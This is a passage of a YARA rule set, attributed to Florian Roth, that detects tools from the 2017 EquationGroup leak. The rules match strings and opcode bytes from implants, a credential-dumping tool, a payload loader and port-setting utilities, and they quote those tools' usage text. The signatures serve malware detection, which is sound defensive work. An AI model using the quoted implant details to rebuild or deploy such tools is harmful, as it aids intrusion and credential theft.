( 0 ) == 0x5a4d and filesize < 20KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_PC_Level3_Gen_RID368C : APT DEMO EXE FILE GEN {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:00:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c7dd49b98f399072c2619758455e8b11c6ee4694bb46b2b423fa89f39b185a97\"\n      hash2 = \"f6b723ef985dfc23202870f56452581a08ecbce85daf8dc7db4491adaa4f6e8f\"\n      tags = \"APT, DEMO, EXE, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"S-%u-%u\" fullword ascii\n      $s2 = \"Copyright (C) Microsoft\" fullword wide\n      $op1 = { 24 39 65 c6 44 24 3a 6c c6 44 24 3b 65 c6 44 24 } \n      $op2 = { 44 24 4e 41 88 5c 24 4f ff } \n      $op3 = { 44 24 3f 6e c6 44 24 40 45 c6 44 24 41 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_put_Implant9x_RID3734 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:28:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8fcc98d63504bbacdeba0c1e8df82f7c4182febdf9b08c578d1195b72d7e3d5f\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"3&3.3<3A3F3K3V3c3m3\" fullword ascii\n      $op1 = { c9 c2 08 00 b8 72 1c 00 68 e8 c9 fb ff ff 51 56 } \n      $op2 = { 40 1b c9 23 c8 03 c8 38 5d 14 74 05 6a 03 58 eb } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 2 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_promiscdetect_safe_RID396A : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:02:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6070d8199061870387bb7796fb8ccccc4d6bafed6718cbc3a02a60c6dc1af847\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"running on this computer!\" fullword ascii\n      $s2 = \"- Promiscuous (capture all packets on the network)\" fullword ascii\n      $s3 = \"Active filter for the adapter:\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_PacketScan_Implant_RID3907 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:46:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9b97cac66d73a9d268a15e47f84b3968b1f7d3d6b68302775d27b99a56fbb75a\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op0 = { e9 ef fe ff ff ff b5 c0 ef ff ff 8d 85 c8 ef ff } \n      $op1 = { c9 c2 04 00 b8 34 26 00 68 e8 40 05 00 00 51 56 } \n      $op2 = { e9 0b ff ff ff 8b 45 10 8d 4d c0 89 58 08 c6 45 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_SetPorts_RID353A : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:04:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"722d3cf03908629bc947c4cca7ce3d6b80590a04616f9df8f05c02de2d482fb2\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"USAGE: SetPorts <input file> <output file> <version> <port1> [port2] [port3] [port4] [port5]\" fullword ascii\n      $s2 = \"Valid versions are:  1 = PC 1.2   2 = PC 1.2 (24 hour)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_GrDo_FileScanner_Implant_RID3B3F : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 20:21:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"8d2e43567e1360714c4271b75c21a940f6b26a789aa0fce30c6478ae4ac587e4\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"system32\\\\winsrv.dll\" fullword wide\n      $s2 = \"raw_open CreateFile error\" fullword ascii\n      $s3 = \"\\\\dllcache\\\\\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_msgks_mskgu_RID36A1 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:04:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7b4986aee8f5c4dca255431902907b36408f528f6c0f7d7fa21f079fa0a42e09\"\n      hash2 = \"ef906b8a8ad9dca7407e0a467b32d7f7cf32814210964be2bfb5b0e6d2ca1998\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 } \n      $op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 } \n      $op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Ifconfig_Target_RID37E1 : APT DEMO EXE FILE T1543_003 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:57:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1ebfc0ce7139db43ddacf4a9af2cb83a407d3d1221931d359ee40588cfd0d02b\"\n      tags = \"APT, DEMO, EXE, FILE, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters\\\\Interfaces\\\\%hs\" fullword wide\n      $op1 = { 0f be 37 85 f6 0f 85 4e ff ff ff 45 85 ed 74 21 } \n      $op2 = { 4c 8d 44 24 34 48 8d 57 08 41 8d 49 07 e8 a6 4b } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_DiBa_Target_RID360C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:39:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ffff3526ed0d550108e97284523566392af8523bbddb5f212df12ef61eaad3e6\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 41 5a 41 59 41 58 5f 5e 5d 5a 59 5b 58 48 83 c4 } \n      $op2 = { f9 48 03 fa 48 33 c0 8a 01 49 03 c1 49 f7 e0 88 } \n      $op3 = { 01 41 f6 e0 49 03 c1 88 01 48 33 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Dsz_Implant_RID365B : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:52:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fbe103fac45abe4e3638055a3cac5e7009166f626cf2d3049fb46f3b53c1057f\"\n      hash2 = \"ad1dddd11b664b7c3ad6108178a8dade0a6d9795358c4a7cedbe789c62016670\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%02u:%02u:%02u.%03u-%4u: \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_GenKey_RID3439 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 15:21:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b6f100b21da4f7e3927b03b8b5f0c595703b769d5698c835972ca0c81699ff71\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"* PrivateEncrypt -> PublicDecrypt FAILED\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_wmi_Implant_RID3677 : APT DEMO EXE FILE T1047 T1057 T1546_003 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:57:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"de08d6c382faaae2b4b41b448b26d82d04a8f25375c712c12013cb0fac3bc704\"\n      tags = \"APT, DEMO, EXE, FILE, T1047, T1057, T1546_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"SELECT ProcessId,Description,ExecutablePath FROM Win32_Process\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_clocksvc_RID354E : APT DEMO EXE FILE T1543_003 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:07:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c1bcd04b41c6b574a5c9367b777efc8b95fe6cc4e526978b7e8e09214337fac1\"\n      tags = \"APT, DEMO, EXE, FILE, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"~debl00l.tmp\" fullword ascii\n      $x2 = \"\\\\\\\\.\\\\mailslot\\\\c54321\" fullword ascii\n      $x3 = \"\\\\\\\\.\\\\mailslot\\\\c12345\" fullword ascii\n      $x4 = \"nowMutex\" fullword ascii\n      $s1 = \"System\\\\CurrentControlSet\\\\Services\\\\MSExchangeIS\\\\ParametersPrivate\" fullword ascii\n      $s2 = \"000000005017C31B7C7BCF97EC86019F5026BE85FD1FB192F6F4237B78DB12E7DFFB07748BFF6432B3870681D54BEF44077487044681FB94D17ED04217145B98\" ascii\n      $s3 = \"00000000E2C9ADBD8F470C7320D28000353813757F58860E90207F8874D2EB49851D3D3115A210DA6475CCFC111DCC05E4910E50071975F61972DCE345E89D88\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 2 of ( $s* ) ) )\n}\n\nrule EquationGroup_Toolset_Apr17_xxxRIDEAREA_RID359B : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:20:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"214b0de83b04afdd6ad05567825b69663121eda9e804daff9f2da5554ade77c6\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"USAGE: %s -i InputFile -o OutputFile [-f FunctionOrdinal] [-a FunctionArgument] [-t ThreadOption]\" fullword ascii\n      $x2 = \"The output payload \\\"%s\\\" has a size of %d-bytes.\" fullword ascii\n      $x3 = \"ERROR: fwrite(%s) failed on ucPayload\" fullword ascii\n      $x4 = \"Load and execute implant within the existing thread\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_yak_min_install_RID3834 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:11:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f67214083d60f90ffd16b89a0ce921c98185b2032874174691b720514b1fe99e\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"driver start\" fullword ascii\n      $s2 = \"DeviceIoControl Error: %d\" fullword ascii\n      $s3 = \"Phlook\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_SetOurAddr_RID35D3 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:29:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"04ccc060d401ddba674371e66e0288ebdbfa7df74b925c5c202109f23fb78504\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"USAGE: SetOurAddr <input file> <output file> <protocol> [IP/IPX address]\" fullword ascii\n      $s2 = \"Replaced default IP address (127.0.0.1) with Local IP Address %d.%d.%d.%d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_GetAdmin_LSADUMP_ModifyPrivilege_Implant_RID4116 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 00:30:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c8b354793ad5a16744cf1d4efdc5fe48d5a0cf0657974eb7145e0088fcf609ff\"\n      hash2 = \"5f06ec411f127f23add9f897dc165eaa68cbe8bb99da8f00a4a360f108bb8741\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\system32\\\\win32k.sys\" wide\n      $s2 = \"hKeAddSystemServiceTable\" fullword ascii\n      $s3 = \"hPsDereferencePrimaryToken\" fullword ascii\n      $s4 = \"CcnFormSyncExFBC\" fullword wide\n      $s5 = \"hPsDereferencePrimaryToken\" fullword ascii\n      $op1 = { 0c 2b ca 8a 04 11 3a 02 75 01 47 42 4e 75 f4 8b } \n      $op2 = { 14 83 c1 05 80 39 85 75 0c 80 79 01 c0 75 06 80 } \n      $op3 = { eb 3d 83 c0 06 33 f6 80 38 ff 75 2c 80 78 01 15 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and ( 4 of ( $s* ) or all of ( $op* ) ) )\n}\n\nrule EquationGroup_Toolset_Apr17_SendPKTrigger_RID36EF : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:17:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2f9c7a857948795873a61f4d4f08e1bd0a41e3d6ffde212db389365488fa6e26\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"----====**** PORT KNOCK TRIGGER BEGIN ****====----\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_DmGz_Target_2_RID36BF : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:09:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"55ac29b9a67e0324044dafaba27a7f01ca3d8e4d8e020259025195abe42aa904\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\\\\\.\\\\%ls\" fullword ascii\n      $op0 = { e8 ce 34 00 00 b8 02 00 00 f0 e9 26 02 00 00 48 } \n      $op1 = { 8b 4d 28 e8 02 05 00 00 89 45 34 eb 07 c7 45 34 } \n      $op2 = { e8 c2 34 00 00 90 48 8d 8c 24 00 01 00 00 e8 a4 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_mstcp32_DXGHLP16_tdip_RID391F : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:50:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"26215bc56dc31d2466d72f1f4e1b6388e62606e9949bc41c28968fcb9a9d60a6\"\n      hash2 = \"fcfb56fa79d2383d34c471ef439314edc2239d632a880aa2de3cea430f6b5665\"\n      hash3 = \"a5ec4d102d802ada7c5083af53fd9d3c9b5aa83be9de58dbb4fac7876faf6d29\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" wide\n      $s2 = \"\\\\DosDevices\\\\%ws\" wide\n      $s3 = \"\\\\Device\\\\%ws_%ws\" wide\n      $s4 = \"sys\\\\mstcp32.dbg\" fullword ascii\n      $s5 = \"%ws%03d%ws%wZ\" fullword wide\n      $s6 = \"TCP/IP driver\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 4 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_regprobe_RID354C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:07:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"99a42440d4cf1186aad1fd09072bd1265e7c6ebbc8bcafc28340b4fe371767de\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Usage: %s targetIP protocolSequence portNo [redirectorIP] [CLSID]\" fullword ascii\n      $x2 = \"key does not exist or pinging w2k system\" fullword ascii\n      $x3 = \"RpcProxy=255.255.255.255:65536\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_DoubleFeatureDll_dll_2_RID3A65 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:44:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f265defd87094c95c7d3ddf009d115207cd9d4007cf98629e814eda8798906af\"\n      hash2 = \"8d62ca9e6d89f2b835d07deb5e684a576607e4fe3740f77c0570d7b16ebc2985\"\n      hash3 = \"634a80e37e4b32706ad1ea4a2ff414473618a8c42a369880db7cc127c0eb705e\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".dllfD\" fullword ascii\n      $s2 = \"Khsppxu\" fullword ascii\n      $s3 = \"D$8.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_GangsterThief_Implant_RID3A55 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:42:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"50b269bda5fedcf5a62ee0514c4b14d48d53dd18ac3075dcc80b52d0c2783e06\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\\\\\.\\\\%s:\" fullword wide\n      $s4 = \"raw_open CreateFile error\" fullword ascii\n      $s5 = \"-PATHDELETED-\" ascii\n      $s6 = \"(deleted)\" fullword wide\n      $s8 = \"NULLFILENAME\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_SetCallbackPorts_RID3847 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:14:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"16f66c2593665c2507a78f96c0c2a9583eab0bda13a639e28f550c92f9134ff0\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"USAGE: %s <input file> <output file> <port1> [port2] [port3] [port4] [port5] [port6]\" fullword ascii\n      $s2 = \"You may enter between 1 and 6 ports to change the defaults.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_DiBa_Target_BH_2000_RID3816 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:06:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0654b4b8727488769390cd091029f08245d690dd90d1120e8feec336d1f9e788\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"0M1U1Z1p1\" fullword ascii\n      $s14 = \"SPRQWV\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_rc5_RID3300 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 14:29:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"69e2c68c6ea7be338497863c0c5ab5c77d5f522f0a84ab20fe9c75c7f81318eb\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage: %s [d|e] session_key ciphertext\" fullword ascii\n      $s2 = \"where session_key and ciphertext are strings of hex\" fullword ascii\n      $s3 = \"d = decrypt mode, e = encrypt mode\" fullword ascii\n      $s4 = \"Bad mode, should be 'd' or 'e'\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_PC_Level_Generic_RID37FC : APT DEMO EXE FILE GEN {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:01:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7a6488dd13936e505ec738dcc84b9fec57a5e46aab8aff59b8cfad8f599ea86a\"\n      hash2 = \"0e3cfd48732d0b301925ea3ec6186b62724ec755ed40ed79e7cd6d3df511b8a0\"\n      hash3 = \"d1d6e3903b6b92cc52031c963e2031b5956cadc29cc8b3f2c8f38be20f98a4a7\"\n      tags = \"APT, DEMO, EXE, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"wshtcpip.WSHGetSocketInformation\" fullword ascii\n      $s2 = \"\\\\\\\\.\\\\%hs\" fullword ascii\n      $s3 = \".?AVResultIp@Mini_Mcl_Cmd_NetConnections@@\" fullword ascii\n      $s4 = \"Corporation. All rights reserved.\" fullword wide\n      $s5 = { 49 83 3c 24 00 75 02 eb 5d 49 8b 34 24 0f b7 46 } \n      $op1 = { 44 24 57 6f c6 44 24 58 6e c6 44 24 59 } \n      $op2 = { c6 44 24 56 64 88 5c 24 57 } \n      $op3 = { 44 24 6d 4c c6 44 24 6e 6f c6 44 24 6f } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 2 of ( $s* ) or all of ( $op* ) )\n}\n\nrule EquationGroup_Toolset_Apr17_PC_Level3_http_exe_RID38D3 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:37:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3e855fbea28e012cd19b31f9d76a73a2df0eb03ba1cb5d22aafe9865150b020c\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Copyright (C) Microsoft\" fullword wide\n      $op1 = { 24 39 65 c6 44 24 3a 6c c6 44 24 3b 65 c6 44 24 } \n      $op2 = { 44 24 4e 41 88 5c 24 4f ff } \n      $op3 = { 44 24 